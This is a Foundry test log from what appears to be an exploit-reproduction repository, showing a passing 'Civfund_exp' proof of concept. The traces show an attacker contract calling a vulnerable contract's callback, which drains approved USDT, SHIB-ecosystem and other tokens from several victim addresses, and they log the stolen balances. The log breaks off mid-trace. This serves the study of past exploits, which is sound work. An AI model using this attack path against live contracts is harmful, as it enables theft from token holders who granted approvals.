Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.23s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-07/Civfund_exp.sol:22:5:
   |
22 |     IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:1582:1:
     |
1582 | interface USDT {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-07/Civfund_exp.sol:29:5:
   |
29 |     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2072): Unused local variable.
   --> src/test/2023-07/Civfund_exp.sol:236:24:
    |
236 |         (bool success, bytes memory retData) = address(VulnerableContract).call(
    |                        ^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 317.89ms (521.28µs CPU time)

Ran 1 test for src/test/2023-07/Civfund_exp.sol:ContractTest
[PASS] testExploit() (gas: 2980103)
Logs:
  Attacker USDT balance after exploit: 104995.098497
  Attacker BONE balance after exploit: 20121.200201296387979654
  Attacker WOOF balance after exploit: 37656666.000000000000000000
  Attacker LEASH balance after exploit: 43.213205257076277282
  Attacker SANI balance after exploit: 2460968380.949404909854754588
  Attacker ONE balance after exploit: 2481240198843.183334367906100917
  Attacker CELL balance after exploit: 10966.052921140276907322
  Attacker USDC balance after exploit: 1900.052720
  Attacker SHIB balance after exploit: 238807361.821278282381675116

Traces:
  [3730394] ContractTest::testExploit()
    ├─ [168527] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [83309] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [5031] USDT::balanceOf(0x18b5f62c3830668D64F859A5a71511B2132075F1) [staticcall]
    │   │   │   └─ ← [Return] 45367286577 [4.536e10]
    │   │   ├─ [44278] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 45367286577 [4.536e10], 0x00000000000000000000000018b5f62c3830668d64f859a5a71511b2132075f1)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [39630] USDT::transferFrom(0x18b5f62c3830668D64F859A5a71511B2132075F1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 45367286577 [4.536e10])
    │   │   │   │   ├─ emit Transfer(from: 0x18b5f62c3830668D64F859A5a71511B2132075F1, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 45367286577 [4.536e10])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x000000000000000000000000000000000000000000000000000000000000024b0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [101550] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [27132] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0x22F6b9Cc8E670f6Ad4F43896edeC7E98eae8B6A1) [staticcall]
    │   │   │   └─ ← [Return] 28764158349 [2.876e10]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 28764158349 [2.876e10], 0x00000000000000000000000022f6b9cc8e670f6ad4f43896edec7e98eae8b6a1)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0x22F6b9Cc8E670f6Ad4F43896edeC7E98eae8B6A1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 28764158349 [2.876e10])
    │   │   │   │   ├─ emit Transfer(from: 0x22F6b9Cc8E670f6Ad4F43896edeC7E98eae8B6A1, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 28764158349 [2.876e10])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x000000000000000000000000000000000000000000000000000000000000024c0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [132145] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [57727] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [2534] BONE::balanceOf(0x783e2F71d8967BDEE8Aa2bA0f3B9f402Ac871365) [staticcall]
    │   │   │   └─ ← [Return] 20121200201296387979654 [2.012e22]
    │   │   ├─ [44847] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 20121200201296387979654 [2.012e22], 0x000000000000000000000000783e2f71d8967bdee8aa2ba0f3b9f402ac871365)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] BONE: [0x9813037ee2218799597d83D4a5B6F3b6778218d9]
    │   │   │   ├─ [40067] BONE::transferFrom(0x783e2F71d8967BDEE8Aa2bA0f3B9f402Ac871365, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20121200201296387979654 [2.012e22])
    │   │   │   │   ├─ emit Transfer(from: 0x783e2F71d8967BDEE8Aa2bA0f3B9f402Ac871365, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 20121200201296387979654 [2.012e22])
    │   │   │   │   ├─ emit Approval(owner: 0x783e2F71d8967BDEE8Aa2bA0f3B9f402Ac871365, spender: 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, value: 115792089237316195423570985008687907853269984665640564019336383806616741660281 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x000000000000000000000000000000000000000000000000000000000000024d0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [122527] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [48109] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [2562] 0x6BC08509B36A98E829dFfAD49Fde5e412645d0a3::balanceOf(0x8F159f13f64dB18B8A0742c86Fa8B225CeAd6C5d) [staticcall]
    │   │   │   └─ ← [Return] 37656666000000000000000000 [3.765e25]
    │   │   ├─ [35078] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 37656666000000000000000000 [3.765e25], 0x0000000000000000000000008f159f13f64db18b8a0742c86fa8b225cead6c5d)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] 0x6BC08509B36A98E829dFfAD49Fde5e412645d0a3
    │   │   │   ├─ [30298] 0x6BC08509B36A98E829dFfAD49Fde5e412645d0a3::transferFrom(0x8F159f13f64dB18B8A0742c86Fa8B225CeAd6C5d, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 37656666000000000000000000 [3.765e25])
    │   │   │   │   ├─ emit Transfer(from: 0x8F159f13f64dB18B8A0742c86Fa8B225CeAd6C5d, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 37656666000000000000000000 [3.765e25])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x000000000000000000000000000000000000000000000000000000000000024e0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [130970] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [56552] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [4958] LEASH::balanceOf(0x6a6597CD92D2A78101CC7f2d3BEf3BBfa264f09C) [staticcall]
    │   │   │   └─ ← [Return] 39195460000000000000 [3.919e19]
    │   │   ├─ [41002] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 39195460000000000000 [3.919e19], 0x0000000000000000000000006a6597cd92d2a78101cc7f2d3bef3bbfa264f09c)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] LEASH: [0x27C70Cd1946795B66be9d954418546998b546634]
    │   │   │   ├─ [36222] LEASH::transferFrom(0x6a6597CD92D2A78101CC7f2d3BEf3BBfa264f09C, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 39195460000000000000 [3.919e19])
    │   │   │   │   ├─ emit Transfer(from: 0x6a6597CD92D2A78101CC7f2d3BEf3BBfa264f09C, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 39195460000000000000 [3.919e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x000000000000000000000000000000000000000000000000000000000000024f0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [131948] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [57530] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [2629] SANI::balanceOf(0x899b11881f977AEb5D9Fac5105ce62c877f11763) [staticcall]
    │   │   │   └─ ← [Return] 2300968380797360965652202239 [2.3e27]
    │   │   ├─ [44186] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 2300968380797360965652202239 [2.3e27], 0x000000000000000000000000899b11881f977aeb5d9fac5105ce62c877f11763)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] SANI: [0x4521C9aD6A3D4230803aB752Ed238BE11F8B342F]
    │   │   │   ├─ [39406] SANI::transferFrom(0x899b11881f977AEb5D9Fac5105ce62c877f11763, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2300968380797360965652202239 [2.3e27])
    │   │   │   │   ├─ emit Transfer(from: 0x899b11881f977AEb5D9Fac5105ce62c877f11763, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2300968380797360965652202239 [2.3e27])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002500000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [102165] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [27747] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0x4035918D8e0231D6bF5fFB72Add9EDC917DCfcfa) [staticcall]
    │   │   │   └─ ← [Return] 8552701118 [8.552e9]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 8552701118 [8.552e9], 0x0000000000000000000000004035918d8e0231d6bf5ffb72add9edc917dcfcfa)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0x4035918D8e0231D6bF5fFB72Add9EDC917DCfcfa, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8552701118 [8.552e9])
    │   │   │   │   ├─ emit Transfer(from: 0x4035918D8e0231D6bF5fFB72Add9EDC917DCfcfa, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 8552701118 [8.552e9])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002510000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [102288] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [27870] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0x46DaD8f630736C7265849422F943efD77CB8714f) [staticcall]
    │   │   │   └─ ← [Return] 4200322009 [4.2e9]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 4200322009 [4.2e9], 0x00000000000000000000000046dad8f630736c7265849422f943efd77cb8714f)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0x46DaD8f630736C7265849422F943efD77CB8714f, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4200322009 [4.2e9])
    │   │   │   │   ├─ emit Transfer(from: 0x46DaD8f630736C7265849422F943efD77CB8714f, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4200322009 [4.2e9])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002520000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [102411] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [27993] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0x7b05363f549c929C3dA930f6728e3D74806E4103) [staticcall]
    │   │   │   └─ ← [Return] 4089486430 [4.089e9]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 4089486430 [4.089e9], 0x0000000000000000000000007b05363f549c929c3da930f6728e3d74806e4103)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0x7b05363f549c929C3dA930f6728e3D74806E4103, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4089486430 [4.089e9])
    │   │   │   │   ├─ emit Transfer(from: 0x7b05363f549c929C3dA930f6728e3D74806E4103, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4089486430 [4.089e9])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002530000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [166584] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [92166] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [2553] ONE::balanceOf(0xC21A3B81Efbba41DD319191b07A20eB1f5EeBd61) [staticcall]
    │   │   │   └─ ← [Return] 1246126972598533386119849005648 [1.246e30]
    │   │   ├─ [78406] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 1246126972598533386119849005648 [1.246e30], 0x000000000000000000000000c21a3b81efbba41dd319191b07a20eb1f5eebd61)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] ONE: [0x73A83269b9bbAFC427E76Be0A2C1a1db2a26f4C2]
    │   │   │   ├─ [73626] ONE::transferFrom(0xC21A3B81Efbba41DD319191b07A20eB1f5EeBd61, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1246126972598533386119849005648 [1.246e30])
    │   │   │   │   ├─ emit Transfer(from: 0xC21A3B81Efbba41DD319191b07A20eB1f5EeBd61, to: 0x0000000000000000000000000000000000000000, value: 24922539451970667722396980112 [2.492e28])
    │   │   │   │   ├─ emit Transfer(from: 0xC21A3B81Efbba41DD319191b07A20eB1f5EeBd61, to: 0xd26Cc7C8D96F6Ca5291758d266447f6879A66E16, value: 24922539451970667722396980112 [2.492e28])
    │   │   │   │   ├─ emit Transfer(from: 0xC21A3B81Efbba41DD319191b07A20eB1f5EeBd61, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1196281893694592050675055045424 [1.196e30])
    │   │   │   │   ├─ emit transferWithTax(: 0xC21A3B81Efbba41DD319191b07A20eB1f5EeBd61, : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 1246126972598533386119849005648 [1.246e30], : 24922539451970667722396980112 [2.492e28])
    │   │   │   │   ├─ emit Approval(owner: 0xC21A3B81Efbba41DD319191b07A20eB1f5EeBd61, spender: 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, value: 115792089237316195423570985008687907853269984664394437066859050621793280634287 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
